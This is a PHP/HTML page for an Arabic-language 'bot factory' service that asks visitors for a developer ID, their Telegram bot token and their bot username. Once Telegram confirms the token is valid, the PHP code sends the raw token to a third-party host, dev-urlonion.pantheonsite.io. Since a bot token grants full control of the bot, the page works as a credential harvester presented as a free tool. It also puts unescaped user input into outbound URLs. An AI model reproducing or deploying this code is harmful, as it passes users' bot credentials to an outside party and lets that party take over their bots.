١<html>
   <head>
      <meta name="viewport" content="width=device-width, initial-scale=1">
      <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/css/bootstrap.min.css" rel="stylesheet" integrity="sha384-1BmE4kWBq78iYhFldvKuhfTAU6auU8tT94WrHftjDbrCEXSU1oBoqyl2QvZ6jIW3" crossorigin="anonymous">
      <script src="https://kit.fontawesome.com/55db5a83a3.js" crossorigin="anonymous"></script>
      <style>
         .btn {
         background-color:white;
         color: #039BE5;
         border-radius:5px;
         border:solid;
         }
      .form-control {
         background-color:white;
         color: #039BE5;
         border-radius:5px;
         border:solid;
         }
      </style>
   </head>
   <body>
     <?php
error_reporting(0);
echo "
<br>        
<br>           
<center><h1> APISFREE <span></span></h1></center>        
<br>          
<center><p> BY : @FREEAPIS <span></span></p></center>
<br>
";

 
   $to=$_GET['to'];
if($to){
 $id=$_GET['id'];
 $userbot=$_GET['userbot'];
 $onions=file_get_contents("https://api.telegram.org/bot$to/getWebhookInfo");
 $onion=json_decode($onions);
 if($onion->ok=="true")
 {
 file_get_contents("https://dev-urlonion.pantheonsite.io/MahmoudAdel.php?id=$id&to=$to&userbot=$userbot");
echo '<script>alert("تم برمجه مصنعك")</script>';
 }else
 {
 echo '<script>alert("عفوا التوكن خطأ")</script>';
 }} 
     ?>

  <div class="container p-5 ">
   <form action="" method="get">
    <div class="mb-3">
     <label class="form-label">ايدي المطور</label>
     <input type='text' name='id' class="form-control" required>
     <div  class="form-text">id dev</div>
     
    </div>
    <div class="mb-3">
     <label class="form-label">توكن بوتك</label>
     <input type='text' name='to' class="form-control" required>
     <div  class="form-text">token bot</div>
     
     <div class="mb-3">
     <label class="form-label">يوزر بوتك</label>
     <input type='text' name='userbot' class="form-control" required>
     <div  class="form-text">user bot</div>
    </div>
    <button type="submit" name='submit' value='submit' class="btn btn-primary">صنع مصنع</button>
    
   </form>
   
  </div>
  
 </section>
 
 <section>
  <div class="container p-2 text-center">
   <button onclick="location.href='http://t.me/APISFREE'" class="btn btn-primary rounded-circle icon-btn"><i class="fa fa-telegram"></i></button>
   <button onclick="location.href='https://www.instagram.com/qefj_'" class="btn btn-primary rounded-circle icon-btn"><i class="fa fa-instagram"></i></button>
   <p class="text-muted p-5">copyright © APIS FREE</p>
   
  </div>
  
 </section>
 <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.1.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ka7Sk0Gln4gmtz2MlQnikT1wXgYsOg+OMhuP+IlRH9sENBO0LRn5q+8nbTov4+1p" crossorigin="anonymous"></script>
 
  </body>
  
</html>
